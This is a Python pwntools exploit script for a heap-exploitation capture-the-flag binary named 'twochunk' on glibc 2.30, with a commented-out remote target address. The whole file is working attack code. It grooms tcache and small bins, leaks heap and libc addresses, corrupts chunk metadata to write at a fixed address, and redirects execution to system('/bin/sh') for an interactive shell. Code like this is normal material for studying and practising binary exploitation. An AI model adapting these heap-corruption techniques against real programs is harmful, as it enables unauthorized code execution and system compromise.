from pwn import *
#context.log_level='debug'
context.terminal = ['tmux', 'splitw', '-h']
context.arch='amd64'
def cmd(c):
	p.sendafter(": ",str(c))
def add(idx,size):
	cmd(1)
	cmd(idx)
	cmd(size)
def free(idx):
	cmd(2)
	cmd(idx)
def show(idx):
	cmd(3)
	cmd(idx)
def edit(idx,c):
	cmd(4)
	cmd(idx)
	p.sendafter(": ",c)
def msg(c):
	cmd(6)
	p.sendafter(": ",c)
#p=remote("121.36.209.145",9999)
p=process('./twochunk')
libc=ELF("/lib/x86_64-linux-gnu/libc-2.30.so")
p.sendafter(": ",flat(0x23333000,0x23333020))
p.sendafter(": ","1"*0x40)
for x in range(7):
    add(0,0x188)
    free(0)
for x in range(5):
    add(0,0x88)
    free(0)
add(0,0x188)
add(1,0x99)
free(0)
add(0,0xf8)
free(0)
add(0,0x99)
free(1)
free(0)
add(0,0x188)
add(1,0x99)
free(0)
add(0,0xf8)
free(0)
add(0,0x99)
free(1)
free(0)
add(0,23333)
show(0)
heap=u64(p.read(8))
log.warning(hex(heap))
pay='\0'*0xf8+flat(0x91,heap+0xf0,0x23333000-0x10)
edit(0,pay)
add(1,0x88)
cmd(5)
p.readuntil("age:")
base=u64(p.read(6)+'\0\0')-(0xfff7fbfc6020-0x7ffff7dd5000)
log.warning(hex(base))
cmd(6)
libc.address=base
p.sendafter(": ",flat(libc.sym['system'],0,0,0,0,0,libc.search("/bin/sh").next()))
#gdb.attach(p,'''
#''')
cmd(7)
p.interactive()
